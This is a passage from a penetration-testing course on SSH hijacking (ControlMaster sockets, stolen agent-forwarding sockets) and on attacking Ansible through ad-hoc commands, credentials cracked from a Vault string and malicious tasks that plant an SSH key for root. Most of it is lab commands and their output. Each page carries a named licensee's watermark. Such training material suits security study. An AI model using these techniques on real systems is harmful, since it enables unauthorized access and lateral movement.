user on this VM doesn’t have its public key stored in an authorized_keys file on 
the linuxvictim host at this time. 
Once the connection is established, we’ll move back to the offsec attacker session. We should be 
able to find a socket file in ~/.ssh/controlmaster/ on the controller VM called 
offsec@linuxvictim:22. 
offsec@controller:~$ ls -al ~/.ssh/controlmaster/ 
total 8 
drwxrwxr-x 2 offsec offsec 4096 May 13 13:55 . 
drwx------ 3 offsec offsec 4096 May 13 13:55 .. 
srw------- 1 offsec offsec    0 May 13 13:55 offsec@linuxvictim:22 
Listing 658 - ControlMaster socket 
This socket file represents the legitimate SSH session to the downstream server and, for the sake 
of clarity, we’ll call it “Victim Session”. 
At this point, as an attacker, if we simply SSH to the server listed in the victim’s socket file, we will 
not be prompted for a password and are given direct access to the linuxvictim machine via SSH. 
 
836 (Wikibooks, 2020), https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing 
837 (die.net), https://linux.die.net/man/5/ssh_config 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
537 
offsec@controller:~$ ssh offsec@linuxvictim 
Last login: Wed May 13 16:11:26 2020 from 192.168.120.40 
offsec@linuxvictim:~$  
Listing 659 - Hijacking as the same user with an open socket 
We’re now logged in on the linuxvictim machine without having been required to enter a 
password, effectively “piggybacking” an active legitimate connection to the same machine. 
Now that we’ve demonstrated the first scenario, we’ll close the attacker SSH session as the 
offsec user, while leaving the “Victim Session” open. 
In the second scenario, we’re logged in as a root user (or someone with sudo privileges). In this 
case, we return to our Kali VM and this time, we’ll log in to the controller VM as root instead of 
offsec. From here, we can hijack the open SSH socket using the SSH client’s -S parameter, which 
specifies a socket. 
root@controller:~# ls -al /home/offsec/.ssh/controlmaster 
total 8 
drwxrwxr-x 2 offsec offsec 4096 May 13 16:22 . 
drwx------ 3 offsec offsec 4096 May 13 13:55 .. 
srw------- 1 offsec offsec    0 May 13 16:22 offsec@linuxvictim:22 
 
root@controller:~# ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 
offsec@linuxvictim 
Last login: Wed May 13 16:22:08 2020 from 192.168.120.40 
offsec@linuxvictim:~$  
Listing 660 - Hijacking as root with an open socket 
Once again, we’re able to log in to the linuxvictim machine without being required to enter a 
password. 
14.1.4 
SSH Hijacking Using SSH-Agent and SSH Agent Forwarding 
Now that we’ve covered SSH hijacking with ControlMaster, let’s move on to another technique. 
This method of SSH hijacking revolves around the use of SSH-Agent and SSH Agent Forwarding. 
SSH-Agent is a utility that keeps track of a user’s private keys and allows them to be used without 
having to repeat their passphrases on every connection. 
SSH agent forwarding is a mechanism that allows a user to use the SSH-Agent on an 
intermediate server as if it were their own local agent on their originating machine. This is useful 
in situations where a user might need to ssh from an intermediate host into another network 
segment, which can’t be directly accessed from the originating machine. It has the advantage of 
not requiring the private key to be stored on the intermediate server and the user does not need to 
enter their passphrase more than once. 
This works by passing the SSH key response requests from the remote destination servers back 
through the SSH-Agent on the intermediate hosts to the originating client’s SSH Agent for key 
validation. 
To demonstrate this concept, we’ll cover an attack scenario where a user connects to an 
intermediate server and then to a subsequent remote server using SSH agent forwarding. Then 
we’ll discuss how we can exploit this connection. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
538 
To use an SSH-Agent, there needs to be an SSH keypair set up on the originating machine. This 
can be done with ssh-keygen as we covered earlier, ensuring we set a passphrase. 
For our SSH connections to work using SSH-Agent forwarding, we need to have our public key 
installed on both the intermediate server and the destination server. In our case, the intermediate 
server will be the controller machine and the destination server will be linuxvictim. We can copy 
our key to both of them using the ssh-copy-id command from our Kali VM, specifying our public 
key with the -i flag. 
kali@kali:~$ ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller 
 
kali@kali:~$ ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim 
 
Listing 661 - Copying our SSH keys to the servers 
Additionally, we need to set our local SSH config file in ~/.ssh/config on our Kali VM to have the 
following line. 
ForwardAgent yes 
Listing 662 - Enabling agent forwarding on client machine 
This tells the SSH client we’re connecting from to enable agent forwarding for connections. 
Next, on the intermediate server, which in our case is the controller, we need to have the following 
line set in /etc/ssh/sshd_config. 
AllowAgentForwarding yes 
Listing 663 - Allowing agent forwarding on intermediate server 
This allows the intermediate server to forward key challenges back to the originating client’s SSH 
agent. 
SSH-Agent is automatically set to run on many Linux distributions, but we’ll need to start it 
manually on our Kali VM. 
kali@kali:~$ eval `ssh-agent` 
Listing 664 - Running SSH-Agent manually 
We can now add our keys to the SSH-Agent on our Kali VM using ssh-add. If we just want to use 
the key that is in the default key location (~/.ssh/id_rsa), we don’t need to specify any parameters. 
Alternatively, we can add the path to the key file we want to use immediately after the command. 
In our case, since our key is in the default location, we can just run ssh-add. 
kali@kali:~$ ssh-add 
Enter passphrase for /home/kali/.ssh/id_rsa:  
Identity added: /home/kali/.ssh/id_rsa (kali@kali) 
Listing 665 - Running ssh-add 
Now that our key is registered with the agent, all we need to do to connect to the downstream 
server is a pair of ssh commands. We’ll first ssh to the controller and then from there to the 
linuxvictim host. 
kali@kali:~$ ssh offsec@controller 
Enter passphrase for key '/home/kali/.ssh/id_rsa': 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
539 
 
offsec@controller:~$ ssh offsec@linuxvictim 
 
offsec@linuxvictim:~$  
Listing 666 - SSHing through an intermediate server 
Note that we’ll need to type our private key passphrase for the first connection so that the SSH-
Agent can keep track of it. 
Now that we know how to use SSH agent forwarding normally, let’s discuss how to exploit it. We’ll 
talk about two scenarios as we did with the ControlMaster example. We’ll cover a case where we 
compromised an unprivileged user who has an open SSH session on the intermediate server and 
then the same scenario but with root privileges. 
Let’s discuss the first scenario where we have compromised the account of a user who is logged 
in to the intermediate server. With our previous ControlMaster exploitation, we were restricted to 
connecting to downstream servers that the user had an existing open connection to. With SSH 
agent forwarding, we don’t have this restriction. Since the intermediate system acts as if we 
already have the user’s SSH keys available, we can SSH to any downstream server the 
compromised user’s private key has access to. 
To exploit this, the compromised user needs to have an active SSH connection to the 
intermediate server. We’ll simulate this by closing the previous shell to the linuxvictim box opened 
from the controller machine, but we’ll leave the connection to the intermediate server open. This 
will act as the victim SSH offsec user session. Next, to simulate the attacker connection, we’ll 
open a shell to the intermediate server using password authentication as the offsec user, and 
from there, we will ssh to the linuxvictim machine. 
Note that in the attacker session, we’ll ssh to the intermediate box from a root 
kali shell to make sure that we are not leveraging the key pair we have in the kali 
home folder for authenticating with the intermediate server. In a real scenario, 
the attacker connection to the intermediate server would be performed from a 
different box. 
root@kali:~# ssh offsec@controller 
 
offsec@controller:~$ ssh offsec@linuxvictim 
 
offsec@linuxvictim:~$  
Listing 667 - SSHing through an intermediate server 
Excellent! SSH-Agent forwarding did its magic and we were able to access the downstream 
linuxvictim box through SSH key authentication even if we are not in possession of such keys. 
However, there may be a case where we don’t want to be logged in as the user whose SSH 
session is currently open. We may, for example, want to avoid adding artifacts to the logs related 
to that user. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
540 
The SSH-Agent mechanism creates an open socket838 file on the intermediate server that can be 
accessed by users with elevated permissions. If we’ve compromised an account with root level 
access on the intermediate server, we can leverage the victim user’s open socket directly. 
Note that both of these scenarios require the victim user to have an open SSH 
connection to the intermediate server. 
To demonstrate this, we’ll leave our earlier offsec user’s SSH connection to the controller server 
VM open. We’ll then create a new SSH session from our Kali VM to the controller with the root 
user to simulate the attacker shell access. 
As an attacker logged in to the root account on the controller, we first need to find the user’s open 
SSH-Agent socket. We can get a list of SSH connections using ps aux. 
root@controller:~# ps aux | grep ssh 
root      8106  0.0  0.1  72300  3976 ?        Ss   09:20   0:00 /usr/sbin/sshd -D 
root      8249  0.0  0.1 107984  3944 ?        Ss   09:59   0:00 sshd: root@pts/2 
root     15147  0.0  0.3 107984  7192 ?        Ss   11:14   0:00 sshd: offsec [priv] 
offsec   15228  0.0  0.1 107984  3468 ?        S    11:14   0:00 sshd: offsec@pts/0 
root     16298  0.0  0.3 107984  7244 ?        Ss   11:31   0:00 sshd: offsec [priv] 
offsec   16380  0.0  0.1 107984  3336 ?        S    11:31   0:00 sshd: offsec@pts/1 
root     16391  0.0  0.3 107984  7276 ?        Ss   11:31   0:00 sshd: root@pts/3 
root     16488  0.0  0.0  14428  1088 pts/3    S+   11:31   0:00 grep --color=auto ssh 
root@controller:~#  
Listing 668 - Finding user SSH connections via ps 
If we inspect processes with “ssh” in the name, we will find any open connections from the host. 
We can use the usernames listed in these connections with the pstree command to get the 
process ID (PID) values for the SSH processes. 
root@controller:~# pstree -p offsec | grep ssh 
sshd(15228)---bash(15229)---su(15241)---bash(15242) 
sshd(16380)---bash(16381) 
root@controller:~# 
Listing 669 - Finding PIDs using pstree 
We’ll try using the PID highlighted in the final line of the output above, which seems to indicate a 
bash session. We can cat the contents of the PID’s environment file and search for a variable 
called SSH_AUTH_SOCK. 
root@controller:~# cat /proc/16381/environ 
LANG=en_US.UTF-
8USER=offsecLOGNAME=offsecHOME=/home/offsecPATH=/usr/local/sbin:/usr/local/bin:/usr/sb
in:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesMAIL=/var/mail/offsecSHELL=/bin/bash
SSH_CLIENT=192.168.119.120 49916 22SSH_CONNECTION=192.168.119.120 49916 192.168.120.40 
22SSH_TTY=/dev/pts/1TERM=xterm-
256colorXDG_SESSION_ID=29XDG_RUNTIME_DIR=/run/user/1000SSH_AUTH_SOCK=/tmp/ssh-
 
838 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Unix_file_types#Socket 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
541 
7OgTFiQJhL/agent.16380 
root@controller:~#  
Listing 670 - SSH process environment file 
This variable lets SSH-Agent know where its socket file is located. 
In Listing 670, we found the SSH auth socket was located at SSH_AUTH_SOCK=/tmp/ssh-
7OgTFiQJhL/agent.16380. 
As an elevated user, we can use the victim’s SSH agent socket file as if it were our own. 
root@controller:~# SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l 
3072 SHA256:6cyHlr9fISx9kcgR9+1crO1Hnc+nVw0mnmQ/Em5KSfo kali@kali (RSA) 
 
root@controller:~# SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh 
offsec@linuxvictim 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64) 
... 
Last login: Thu Jul 30 11:14:26 2020 from 192.168.120.40 
offsec@linuxvictim:~$ 
Listing 671 - Using the victim’s SSH agent socket as our own 
The first command sets our current privileged user’s SSH_AUTH_SOCK environment variable to 
the open SSH socket of our victim. We then use ssh-add -l to show that the key is in our SSH 
Agent cache. 
In the second command, we re-set the environment variable for the socket and then are able to 
ssh to the linuxvictim host as the victim user. 
SSH hijacking can be a useful tool for lateral movement within a network. In the next section, we’ll 
inspect an infrastructure tool commonly used to configure Linux systems and learn how it can be 
used for lateral movement. 
14.1.4.1 Exercises 
1. 
Reproduce ControlMaster hijacking in the lab. 
2. 
Reproduce SSH-Agent forwarding hijacking in the lab. 
14.2 DevOps 
DevOps839 is an overall strategy used to promote consistency and automation. In particular, 
Devops applies to management of software builds, system changes, and infrastructure 
modifications. While a thorough exploration of DevOps is outside the scope of this module, it is 
helpful to recognize this trend toward increasing and improving process automation in modern 
companies. 
DevOps technologies make traditional infrastructure and configuration tasks much more 
streamlined and efficient. They can quickly make configuration changes or system deployments 
that would have taken much more time. In some cases, these deployments are nearly 
instantaneous. 
 
839 (Wikipedia, 2020), https://en.wikipedia.org/wiki/DevOps 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
542 
Due to the automated nature of these systems and the impact they can have on system output or 
corporate infrastructure, they can be useful to an attacker who wants to traverse internal 
networks. 
DevOps mechanisms’ inherent purpose is reconfiguring systems, especially by means of elevated 
privileges. This makes them a valuable target for exploitation. 
There are many systems available that perform these sorts of functions. Puppet840 and Chef841 
are both popular, but in this module we will take a closer look at Ansible,842 which we’ve frequently 
encountered in penetration testing engagements. 
14.2.1 
Introduction to Ansible 
Ansible is an infrastructure configuration engine that enables IT personnel to dynamically and 
automatically configure IT infrastructure and computing resources. It works through a “push” 
model where the Ansible controller connects to registered “nodes” and runs “modules” on them. 
Ansible modules843 are specialized Python scripts that are transported to the nodes by Ansible 
and then run to perform certain actions. This can be anything from gathering data to configuring 
settings or running commands and applications. After the scripts are run, artifacts from running 
the scripts are deleted and any data gathered by the script is returned to the controller. 
In order for a machine to be set up as a node for an Ansible controller, it needs to be part of the 
Ansible inventory844 on the controller server, normally located at /etc/ansible/hosts. Servers in the 
inventory can be grouped so that certain actions can be performed on some groups but not 
others. 
For actions to be performed on the node, either the password for a user on the node needs to be 
stored on the controller, or the controller’s Ansible account needs to be configured on the node 
using SSH keys. This allows the controller to connect to the node via SSH or other means and run 
the desired modules. 
Because the Ansible server needs elevated privileges to perform certain tasks on the end node, 
the user configured by Ansible typically has root or sudo-level permissions.845 Because of this, 
compromising the Ansible server or getting the private key for an Ansible configuration account 
could allow complete compromise of any nodes in the Ansible controller’s inventory. 
Before we learn how to exploit Ansible, let’s spend a little time learning about its intended use. In 
the lab, we’ll use the controller and linuxvictim machines to demonstrate these concepts. They 
will perform the roles of the Ansible controller and node respectively. 
The ansibleadm user on the controller issues commands. The same account exists on the victim 
node. This account on the victim has the public key for the controller’s ansibleadm user set in its 
 
840 (Puppet, 2020), https://www.puppet.com 
841 (Chef, 2020), https://www.chef.io 
842 (Red Hat, Inc., 2020), https://www.ansible.com 
843 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/user_guide/modules_intro.html 
844 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/user_guide/intro_inventory.html 
845 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/user_guide/become.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
543 
authorized_keys file to allow access. This user has sudo rights on the node to be able to perform 
privileged actions. 
We can find the host inventory on the controller at /etc/ansible/hosts. 
offsec@controller:~$ cat /etc/ansible/hosts 
... 
[victims] 
linuxvictim 
Listing 672 - The Ansible inventory on our lab controller 
If we examine it, we find that it consists of only one host, the linuxvictim machine as part of a 
group called “victims”. 
14.2.2 
Enumerating Ansible 
Now that we’ve covered Ansible’s intended use cases, let’s shift our perspective to that of an 
attacker. The first thing we need to do is determine whether or not Ansible is in use on our target 
system. 
The quickest way to do this is to run the ansible command. 
offsec@controller:~$ ansible 
usage: ansible [-h] [--version] [-v] [-b] [--become-method BECOME_METHOD] 
               [--become-user BECOME_USER] [-K] [-i INVENTORY] [--list-hosts] 
... 
 
Listing 673 - Checking for Ansible on the target 
Some other indicators would be the existence of an /etc/ansible filepath, which contains Ansible 
configuration files, or the presence of “ansible” related usernames in /etc/passwd. 
These clues would exist on an Ansible controller system. To identify whether a machine we’re on 
is an Ansible node instead, it can be useful to examine the list of users in /etc/passwd for Ansible-
related usernames. We may also be able to identify Ansible nodes. First, we could examine the list 
of users in /etc/passwd for Ansible-related usernames. 
We might also check for the list of home folders, which may give away whether a user account 
exists for performing Ansible actions. Finally, it may also be possible to detect Ansible-related log 
messages in the system’s syslog file. 
Now that we know Ansible is installed on the target, let’s explore a few different attack vectors. 
14.2.3 
Ad-hoc Commands 
Node actions can be initiated from an Ansible controller in two primary ways. The first is through 
ad-hoc commands,846 and the second involves the use of playbooks.847 Let’s begin with ad-hoc 
commands. 
 
846 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/user_guide/intro_adhoc.html 
847 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/user_guide/playbooks.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
544 
Ad-hoc commands are simple shell commands to be run on all, or a subset, of machines in the 
Ansible inventory. They’re called “ad-hoc” because they’re not part of a playbook (which scripts 
actions to be repeated). Typically, ad-hoc commands would be for one-off situations where we 
would want to run a command on multiple servers. 
To find out how a command behaves outside of an attack scenario, let’s run an ad-hoc command 
on our linuxvictim machine as ansibleadm using the following on the controller. 
ansibleadm@controller:~$ ansible victims -a "whoami" 
... 
linuxvictim | CHANGED | rc=0 >> 
ansibleadm 
Listing 674 - Ad-hoc command 
The above command ran whoami on all members of the victims group, which, in our case, is 
limited to only the linuxvictim machine. The command returned the result, which is “ansibleadm”. 
If we wanted to run a command as root or a different user, we can use the --become parameter. 
Without a value, this defaults to root, but we could specify a user if we want. 
ansibleadm@controller:~$ ansible victims -a "whoami" --become 
... 
linuxvictim | CHANGED | rc=0 >> 
root 
Listing 675 - Ad-hoc command as root 
In Listing 675, our command ran as root on the victim machine. 
The potential of this attack vector is devastating. If we can gain privileges to run ad-hoc 
commands from the Ansible controller, we have backdoor root access to run commands on any 
of the hosts in the inventory file (under most common configurations). 
14.2.4 
Ansible Playbooks 
Now that we’ve learned how Ad-hoc commands work, let’s move on to a more common method, 
which will take advantage of Ansible playbooks. As before, we’ll first take a look at how playbooks 
are intended to function and then discuss how to exploit them. 
Playbooks allow sets of tasks to be scripted so they can be run routinely at points in time. This is 
useful for combining various setup tasks, such as adding user accounts and settings to a new 
server or updating large numbers of machines at once. 
Although it is quite common to run playbooks with elevated privileges, it is not 
always necessary. Security-aware administrators will set up dedicated users for 
Ansible tasks and limit their access to only what they need. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
545 
Playbooks are written using the YAML848 markup language. Let’s try a simple playbook on our 
controller. In /opt/playbooks/, we’ll create a file called getinfo.yml with the following contents. 
--- 
- name: Get system info 
  hosts: all 
  gather_facts: true 
  tasks: 
    - name: Display info 
      debug: 
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ 
ansible_distribution }}" 
Listing 676 - A simple playbook 
The name value just gives a name to the playbook being run, and hosts specifies which hosts 
from the inventory this playbook should be run on. We can specify groups, individual hosts, or 
“all”. 
The gather_facts value will gather information, or “facts”, about the machine.849 These facts are 
returned in a JSON format, then parsed by the controller to be used during processing of the 
playbook. 
This process fills the {{ansible_hostname}} and {{ansible-distribution}} variables in our output. Both 
variables are the results of the initial fact-gathering process. 
The tasks line specifies a new task to be performed, labeled with a name. The task also has a msg 
value containing a string with our output to be displayed when the task is run. 
A task is just a call to an Ansible module. The Ansible documentation850 contains a full list of 
available modules. In our playbook above, we run the debug module and provide a parameter of 
msg with a message to display. 
We can run the playbook using the ansible-playbook command. 
ansibleadm@controller:/opt/playbooks$ ansible-playbook getinfo.yml  
 
PLAY [Get system info] *************************************************************** 
 
TASK [Gathering Facts] *************************************************************** 
... 
ok: [linuxvictim] 
 
TASK [Display info] ****************************************************************** 
ok: [linuxvictim] => { 
    "msg": "The hostname is linuxvictim and the OS is Ubuntu" 
} 
 
PLAY RECAP *************************************************************************** 
 
848 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html#yaml-syntax 
849 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/user_guide/playbooks_variables.html#variables-discovered-from-
systems-facts 
850 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/user_guide/modules_intro.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
546 
linuxvictim             : ok=2    changed=0    unreachable=0    failed=0    skipped=0    
rescued=0    ignored=0    
Listing 677 - Running the first playbook 
The playbook was run on the victim system and was able to retrieve the victim’s hostname and 
Linux distribution type. 
Playbooks can also include a “become: yes” line if we want the scripts to be run as root. 
Alternatively, we can include a username if we want to run as someone else. 
Playbooks are used more frequently than ad-hoc commands because they allow sysadmins to 
script tasks they would want to repeat more than once. Ad-hoc commands are useful for one-off 
actions, but if a sysadmin wishes to reconfigure systems the same way multiple times, run 
multiple tasks on the same sets of machines, or gather specific sets of information from different 
machines at different times, playbooks can be very handy. 
14.2.5 
Exploiting Playbooks for Ansible Credentials 
We’ve discussed normal practice for Ansible, but as attackers, our attention is on the potential 
exploit. Of course, if we have root access or access to the Ansible administrator account on the 
Ansible controller, we can run ad-hoc commands or playbooks as the Ansible user on all nodes, 
typically with elevated or root access. 
In addition, if Ansible is set up to use SSH for authentication to nodes, we could steal the Ansible 
administrator user’s private key from their home folder and log in to the nodes directly. All of 
these are options if we’re already root on the controller. 
This, of course, assumes there isn’t a strong passphrase set for the keys. Often 
the private keys used by Ansible do not contain passphrases as Ansible 
configuration is intended to be run in an automated fashion. 
Unfortunately, these methods require root (or Ansible admin account) access, which we might 
not have. Let’s explore additional options available to us as a non-root user. 
If stored playbooks on the controller are in a world-readable location or we have access to the 
folder they’re stored in, we can search for hardcoded credentials. 
In some cases, it may be necessary or desirable for an administrator to avoid configuring a public 
key on a node machine. In this case, it’s possible for the administrator to run commands on the 
node using SSH usernames and passwords instead. 
In the following example, in our controller VM, the administrator of our Ansible controller wanted 
to create a file in the linuxvictim machine, but they needed to authenticate to the system as the 
offsec user. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
547 
 
In our lab environment, the victim machine does have an SSH key set up (for the 
ansibleadm user), but for demonstration purposes, we’ll pretend it doesn’t and 
perform our actions as the offsec user. 
This user does not have the ansibleadm user’s key in its authorized_keys file and so the sysadmin 
needed to use the offsec user’s username and password to authenticate. 
To do this, the administrator hardcoded the offsec user’s credentials in the playbook, located in 
/opt/playbooks/writefile.yaml. 
--- 
- name: Write a file as offsec 
  hosts: all 
  gather_facts: true 
  become: yes 
  become_user: offsec 
  vars: 
    ansible_become_pass: lab 
  tasks: 
    - copy: 
          content: "This is my offsec content" 
          dest: "/home/offsec/written_by_ansible.txt" 
          mode: 0644 
          owner: offsec 
          group: offsec 
Listing 678 - Hardcoded ansible credentials 
The credentials are stored in the highlighted line above with the keyword ansible_become_pass. 
The above script indicates that the user that the script is becoming (in this case offsec) has a 
password of “lab”. 
We can run the playbook and verify that the file is written. 
ansibleadm@controller:/opt/playbooks$ ansible-playbook writefile.yaml  
 
PLAY [Write a file as offsec] 
**************************************************************** 
 
TASK [Gathering Facts] 
*********************************************************************** 
ok: [linuxvictim] 
 
TASK [copy] 
********************************************************************************** 
changed: [linuxvictim] 
 
PLAY RECAP 
*********************************************************************************** 
linuxvictim                : ok=2    changed=1    unreachable=0    failed=0    
skipped=0    rescued=0    ignored=0 
Listing 679 - Running the playbook 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
548 
If we don’t have access to run ansible-playbook but have read access to playbooks, we may be 
able to harvest sensitive credentials and compromise nodes used by Ansible. 
Ansible does have newer features such as Ansible Vault,851 which allows for secure storage of 
credentials for use in playbooks. Ansible Vault allows the user to encrypt or decrypt files or strings 
using a password. 
On our controller VM, we find another playbook called /opt/playbooks/writefilevault.yaml. If we 
examine the contents, there is a different password type listed. 
ansible_become_pass: !vault | 
          $ANSIBLE_VAULT;1.1;AES256 
          
39363631613935326235383232616639613231303638653761666165336131313965663033313232 
          
3736626166356263323964366533656633313230323964300a323838373031393362316534343863 
          
36623435623638373636626237333163336263623737383532663763613534313134643730643532 
          
3132313130313534300a383762366333303666363165383962356335383662643765313832663238 
          3036 
Listing 680 - Encrypted vault password string 
The !vault keyword lets Ansible know that the value is vault-encrypted. As an attacker, we can 
copy the section of the encrypted payload above starting with “$ANSIBLE_VAULT” and attempt to 
crack it offline. 
Let’s copy the value above and put it into a text file called test.yml on our Kali VM. Again, in order 
to crack the password, we need to convert it to a format that John the Ripper or Hashcat can use. 
To do that, we can use the ansible2john utility included with JTR. This utility is included with 
default Kali installations at the following location: /usr/share/john/ansible2john.py. 
Note that the original encrypted string needs to be in the same format as shown 
above in Listing 680, but without any leading whitespace shown or it will fail with 
parsing errors. 
If we run ansible2john.py on the file, it returns a string in a workable format for Hashcat to use. 
kali@kali:~$ python3 /usr/share/john/ansible2john.py ./test.yml  
test.yml:$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef312029d0
*87b6c306f61e89b5c586bd7e182f2806*28870193b1e448c6b45b68766bb731c3bcb77852f7ca54114d70
d52121101540 
Listing 681 - Converting our Ansible Vault encrypted string to a crackable format 
We’ll copy the string returned in Listing 681 after the initial filename and colon character into a 
new file called testhash.txt. 
Now we can run hashcat on our file to crack the vault password using the rockyou.txt wordlist. 
 
851 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/user_guide/vault.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
549 
kali@kali:~$ hashcat testhash.txt --force --hash-type=16900 
/usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting... 
... 
* Device #1: Kernel amp_a0.7da82001.kernel not found in cache! Building may take a 
while... 
Dictionary cache built: 
* Filename..: /usr/share/wordlists/rockyou.txt 
* Passwords.: 14344392 
* Bytes.....: 139921507 
* Keyspace..: 14344385 
* Runtime...: 2 secs 
 
$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef312029d0*87b6c306
f61e89b5c586bd7e182f2806*28870193b1e448c6b45b68766bb731c3bcb77852f7ca54114d70d52121101
540:spongebob 
... 
Listing 682 - Cracked the vault password 
As indicated in the highlighted result above, Hashcat was able to crack the vault password. 
Back on our controller VM, we can copy the original encrypted vault string into a text file and pipe 
it to ansible-vault decrypt. We’re prompted for our vault password (“spongebob”) and then vault 
will provide us with the original, unencrypted password stored in the playbook for the offsec user. 
ansibleadm@controller:/opt/playbooks$ cat pw.txt 
$ANSIBLE_VAULT;1.1;AES256 
39363631613935326235383232616639613231303638653761666165336131313965663033313232 
3736626166356263323964366533656633313230323964300a323838373031393362316534343863 
36623435623638373636626237333163336263623737383532663763613534313134643730643532 
3132313130313534300a383762366333303666363165383962356335383662643765313832663238 
3036 
 
ansibleadm@controller:/opt/playbooks$ cat pw.txt | ansible-vault decrypt 
Vault password:  
lab 
Decryption successful 
Listing 683 - Decrypted the original encrypted password 
Decrypting encrypted files (as opposed to strings) is essentially the same process, since files are 
encrypted using the same encryption scheme. 
14.2.6 
Weak Permissions on Ansible Playbooks 
Another option we have at our disposal for exploiting Ansible environments is to take advantage 
of playbooks that we have write access to. 
If the playbook files used on the controller have world-writable permissions or if we can find a 
way to write to them (perhaps through an exploit), we can inject tasks that will then be run the 
next time the playbook is run. 
In the controller VM, the playbook /opt/playbooks/getinfowritable.yaml has lax permissions, 
allowing anyone within the “ansible” group to write to it. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
550 
In this particular scenario, we assume we have compromised the bystander account, which is in 
the “ansible” group. Because of this, the user has write access to the playbooks folder through 
group permissions. If we log in to the controller as bystander, we can edit the getinfowritable.yaml 
playbook. 
Let’s modify the file by adding few tasks to it. 
--- 
- name: Get system info 
  hosts: all 
  gather_facts: true 
  become: yes 
  tasks: 
    - name: Display info 
      debug: 
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ 
ansible_distribution }}" 
 
    - name: Create a directory if it does not exist 
      file: 
        path: /root/.ssh 
        state: directory 
        mode: '0700' 
        owner: root 
        group: root 
 
    - name: Create authorized keys if it does not exist 
      file: 
        path: /root/.ssh/authorized_keys 
        state: touch 
        mode: '0600' 
        owner: root 
        group: root 
 
    - name: Update keys 
      lineinfile: 
        path: /root/.ssh/authorized_keys 
        line: "ssh-rsa AAAAB3NzaC1...Z86SOm..." 
        insertbefore: EOF 
Listing 684 - Rogue tasks added to the playbook 
We could completely overwrite the playbook if we wanted to, but that would change its intended 
functionality. This behavior is likely to be noticed by the administrator, especially if the playbook is 
run frequently. It’s much more discreet to keep the original functionality intact, tack on several 
new tasks, and add the become value to ensure the playbook is run as root. 
The first task we inserted creates the /root/.ssh folder and sets the appropriate permissions on it. 
The second task creates the authorized_keys file and sets its permissions. The last task copies 
our public key into the root user’s authorized_keys file, appending it to the end if the file already 
exists. In this case, we’ve used the public key from our Kali VM. 
If the playbook is run by the ansibleadm user, our key is added to the root user’s account on the 
linuxvictim host. Once it is added, we are able to SSH to the linuxvictim machine from our Kali VM 
as root. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
551 
kali@kali:~$ ssh root@linuxvictim 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64) 
... 
